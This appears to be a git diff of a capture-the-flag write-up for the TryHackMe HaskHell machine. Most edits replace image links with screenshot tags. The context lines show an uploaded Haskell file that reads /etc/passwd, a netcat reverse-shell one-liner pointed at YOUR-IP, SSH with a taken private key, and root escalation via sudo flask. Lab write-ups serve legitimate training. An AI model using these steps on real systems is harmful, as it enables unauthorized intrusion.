@@ -1,5 +1,6 @@
 # Tryhackme - HaskHell - WruteUp
-![alt text](image.png)
+
+<img width="121" height="108" alt="Screenshot 2025-10-31 125957" src="https://github.com/user-attachments/assets/8fd5e8a0-4bd9-4125-87bd-f387347d485d" />
 
 ## Description
 This machine provides an excellent hands-on introduction to Haskell programming for security enthusiasts. It’s simple enough for beginners yet offers interesting challenges that deepen understanding. Working through the exercises builds practical skills and reinforces functional programming concepts. The experience is both educational and engaging, making it a worthwhile learning opportunity.
@@ -41,14 +42,16 @@ There are two ports open:
 
 ## Directory Scanning
 Accessing the http://target-ip:5001 on web we can see the following page.
-![](image-1.png)
+
+<img width="1358" height="525" alt="Screenshot 2025-10-31 130922" src="https://github.com/user-attachments/assets/811879b6-f335-4f70-89ae-368cb4c17433" />
 
 It's a welcome message for the Haskell programming language. Now we can fuzz the page using any directory scanning tool. I prefer the [dirsearch](https://github.com/maurosoria/dirsearch).
 
-![alt text](image-2.png)
+<img width="842" height="359" alt="Screenshot 2025-10-31 131422" src="https://github.com/user-attachments/assets/5772d0f7-889a-4aed-9339-4bcb523f84b0" />
 
 Dirsearch found the submit folder which is accessible and is an upload file functionality.
-![alt text](image-3.png)
+
+![al<img width="540" height="211" alt="Screenshot 2025-10-31 131628" src="https://github.com/user-attachments/assets/6f125d31-0e25-4844-8b32-16f34baf9034" />
 
 I try to upload a php revese shell file but nothing happened. But if we upload a .hs file it shows results. I create this file to access the /etc/passwd file.
 ```php
@@ -61,7 +64,8 @@ main = do
         hClose handle
 ```
 After I hit Upload i get this results.
-![alt text](image-4.png)
+
+<img width="703" height="529" alt="Screenshot 2025-10-31 132102" src="https://github.com/user-attachments/assets/e4871df5-bc56-45ae-95f6-0fa9452ba5dc" />
 
 Now it's time for the reverse shell part
 ## Reverse shell - User Flag
@@ -75,7 +79,8 @@ main = callCommand "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | sh -i 2>&1 | nc YOUR-IP
 ```
 
 Save it with the extension .hs, start a netcat listener and upload it.
-![alt text](image-5.png)
+
+<img width="501" height="294" alt="Screenshot 2025-10-31 132843" src="https://github.com/user-attachments/assets/c74fffe1-100f-49a9-8a9b-6dc4916c1716" />
 
 After the successful reverse shell connection the user flag located to the path: /home/prof/user.txt
 ```
@@ -101,7 +106,7 @@ Now log in to prof user with the following ssh command:
 ```
 ssh prof@<TARGET-IP> -i id_rsa
 ```
-![alt text](image-6.png)
+<img width="880" height="481" alt="Screenshot 2025-10-31 133810" src="https://github.com/user-attachments/assets/2786958f-ccb1-4101-a1bf-00790775d1fc" />
 
 ## Root Flag
 After we logged in with prof user we can type sudo -l to see what can the prof user run with sudo.
@@ -156,4 +161,5 @@ prof@haskhell:/tmp$ export FLASK_APP=/tmp/shell.py
 prof@haskhell:/tmp$ sudo /usr/bin/flask run
 ```
 Now we are Root
-![alt text](image-7.png)
+
+<img width="599" height="147" alt="Screenshot 2025-10-31 134743" src="https://github.com/user-attachments/assets/a58dacfa-cde9-4148-bd23-6ddda401e27a" />
